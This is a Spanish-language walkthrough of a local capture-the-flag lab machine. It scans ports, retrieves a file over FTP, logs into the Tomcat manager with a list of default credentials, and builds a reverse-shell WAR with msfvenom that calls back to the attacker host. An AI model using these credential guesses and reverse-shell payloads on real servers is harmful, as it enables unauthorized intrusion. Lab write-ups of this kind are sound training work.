Lo primero es desplegar la máquina virtual con el siguiente comando.
bash auto_deploy.sh pn.tar
![[Pasted image 20240604212012.png]]

Copiamos la ip y realizamos el escaneo de puertos con este comando.
sudo nmap -sSCV -n -Pn --min-rate 5000 -p- --open 172.17.0.2 

![[Pasted image 20240604212536.png]]

Como podemos observar tenemos abiertos tanto los puertos 21 y 8080

Con lo cual podemos observar que el puerto 21 tiene el servicio ftp.
Vamos a establecer conexión ftp.

![[Pasted image 20240604213826.png]]

Ingresamos el comando (ls) para comprobar el contenido del lugar.
Vemos que tiene un archivo llamado tomcat.txt
![[Pasted image 20240604213937.png]]

Descargamos el archivo tomcat.txt mediante el comando get.
![[Pasted image 20240604214420.png]]

Ahora vamos a comprobar la pagina que tiene el servidor mediante el comando whatweb [IP]
![[Pasted image 20240604214902.png]]
Vemos que aloja un servidor web, colocamos en el buscador la ip que en este caso sería 172.17.0.2:8080
![[Pasted image 20240604215024.png]]

En la página web tenemos un apartado con un link para acceder al manager webapp.
![[Pasted image 20240604215807.png]]

Hacemos click en este link.
![[Pasted image 20240604215930.png]]

Podemos ver que nos salta este formulario para introducir un usuario con su clave.
![[Pasted image 20240604220004.png]]

En un principio debemos probar con las contraseñas predeterminadas de Tomcat
- admin:admin
- tomcat:tomcat
- admin:
- admin:s3cr3t
- tomcat:s3cr3t
- admin:tomcat
![[Pasted image 20240604220547.png]]
En este caso fue usuario (tomcat) y password(s3cr3t)

Una vez dentro debemos crear un reverse shell con un archivo .war para conseguir el acceso a la máquina, para ello contamos con un comando para generar dicho archivo mediante el comando msfvenom.
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o revshell.war
![[Pasted image 20240604222812.png]]
Vemos como se ha creado el archivo correctamente.

Ahora vamos a ponernos en escucha en el puerto 443
![[Pasted image 20240604221600.png]]

Ahora vamos a subir el archivo que creamos.
![[Pasted image 20240604221703.png]]

Podemos comprobar que se ha subido correctamente

![[Pasted image 20240604222323.png]]

¡Ya estamos dentro!